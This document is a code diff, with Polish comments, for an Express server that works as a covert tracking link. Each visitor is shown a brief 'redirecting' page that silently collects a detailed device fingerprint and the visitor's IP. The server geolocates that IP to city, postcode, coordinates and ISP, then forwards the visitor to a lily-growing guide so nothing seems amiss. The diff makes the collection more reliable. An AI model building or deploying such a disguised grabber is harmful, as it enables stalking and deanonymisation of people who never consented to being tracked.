@@ -9,14 +9,15 @@ app.enable('trust proxy');
 // Docelowa strona przekierowania
 const TARGET_URL = 'https://www.lovethegarden.com/pl-pl/przewodnik-upraw/Jak-uprawiac-i-pielegnowac-lilie';
 
-// 0. Endpoint do podtrzymywania działania (Dla UptimeRobota) - NIE GENERUJE LOGÓW
-app.get('/health', (res) => {
+// 0. Endpoint do podtrzymywania działania (Dla UptimeRobota)
+// POPRAWKA: Express oczekuje parametrów (req, res), wcześniej brakowało 'req'
+app.get('/health', (req, res) => {
     res.status(200).send('OK');
 });
 
 // 1. Endpoint Odbierający Dane (POST)
 app.post('/api/telemetry', async (req, res) => {
-    // Poprawne wyciąganie IP z uwzględnieniem proxy Rendera
+    // Poprawne wyciąganie IP z uwzględnieniem proxy Rendera / Koyeb
     const rawIp = req.headers['x-forwarded-for'];
     const clientIp = rawIp ? rawIp.split(',')[0].trim() : req.ip;
 
@@ -33,10 +34,10 @@ app.post('/api/telemetry', async (req, res) => {
     console.log(`--------------------------------------------------`);
 
     console.log(`[SIEĆ & IP]`);
-    console.log(`Adres IP:                  ${clientIp}`);
+    console.log(`Adres IP:                   ${clientIp}`);
     console.log(`Typ połączenia (Network):   ${telemetry.connectionType || 'Nieznane'}`);
-    console.log(`Szybkość (Downlink):       ${telemetry.downlink ? telemetry.downlink + ' Mbps' : 'Brak danych'}`);
-    console.log(`RTT (Opóźnienie):          ${telemetry.rtt ? telemetry.rtt + ' ms' : 'Brak danych'}`);
+    console.log(`Szybkość (Downlink):        ${telemetry.downlink ? telemetry.downlink + ' Mbps' : 'Brak danych'}`);
+    console.log(`RTT (Opóźnienie):           ${telemetry.rtt ? telemetry.rtt + ' ms' : 'Brak danych'}`);
 
     console.log(`\n[SZCZEGÓŁY SYSTEMU OPERACYJNEGO]`);
     console.log(`System Operacyjny (OS):   ${telemetry.osName || 'Nieznany'}`);
@@ -67,9 +68,9 @@ app.post('/api/telemetry', async (req, res) => {
     console.log(`User-Agent:                ${clientHeaders.userAgent}`);
     console.log(`Źródło (Referrer):         ${telemetry.referrer || clientHeaders.refererHeader}`);
 
-    // Pobieranie pełnych danych GeoIP
+    // Pobieranie pełnych danych GeoIP (Używa natywnego global.fetch dostępnego w Node.js 18+)
     try {
-        if (clientIp && clientIp !== '127.0.0.1' && clientIp !== '::1') {
+        if (clientIp && clientIp !== '127.0.0.1' && clientIp !== '::1' && !clientIp.startsWith('192.168.') && !clientIp.startsWith('10.')) {
             const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`);
             const geo = await geoRes.json();
 
@@ -94,14 +95,14 @@ app.post('/api/telemetry', async (req, res) => {
 
 // 2. Trasa Główna (Serwuje skrypt z odczytem Client Hints i przekierowaniem)
 app.get('*', (req, res) => {
-    res.send(`
-    <!DOCTYPE html>
-    <html lang="pl">
-    <head>
+    res.send(`<!DOCTYPE html>
+<html lang="pl">
+<head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Przekierowywanie...</title>
-    </head>
-    <body>
+</head>
+<body>
     <script>
     (async function() {
         const targetUrl = "${TARGET_URL}";
@@ -112,7 +113,7 @@ app.get('*', (req, res) => {
         let osBitness = "";
         let deviceModel = "";
 
-        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+        if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
             try {
                 const uaData = await navigator.userAgentData.getHighEntropyValues([
                     "platform", "platformVersion", "architecture", "bitness", "model"
@@ -160,33 +161,36 @@ app.get('*', (req, res) => {
             devicePixelRatio: window.devicePixelRatio || 1,
             viewportWidth: window.innerWidth,
             viewportHeight: window.innerHeight,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-     language: navigator.language,
-     languages: navigator.languages ? Array.from(navigator.languages) : [],
-     platform: navigator.platform,
-     userAgent: navigator.userAgent,
-     referrer: document.referrer || "Bezpośrednie",
-     connectionType: conn.effectiveType || "Nieznane",
-     downlink: conn.downlink || null,
-     rtt: conn.rtt || null
+            timezone: (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : "Brak danych",
+            language: navigator.language,
+            languages: navigator.languages ? Array.from(navigator.languages) : [],
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            referrer: document.referrer || "Bezpośrednie",
+            connectionType: conn.effectiveType || "Nieznane",
+            downlink: conn.downlink || null,
+            rtt: conn.rtt || null
         };
 
+        // Rezerwowy mechanizm wysyłki (keepalive zapobiega anulowaniu żądania przy szybkim przekierowaniu)
         try {
             await fetch('/api/telemetry', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify(payload),
+                keepalive: true
             });
         } catch(e) {}
 
-        window.location.href = targetUrl;
+        // Przekierowanie wykonuje się zawsze po próbie wysłania danych
+        window.location.replace(targetUrl);
     })();
     </script>
-    </body>
-    </html>
-    `);
+</body>
+</html>`);
 });
 
-app.listen(process.env.PORT || 3000, () => {
-    console.log('Serwer zbierający dane gotowy do pracy.');
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Serwer zbierający dane uruchomiony na porcie ${PORT}`);
 });
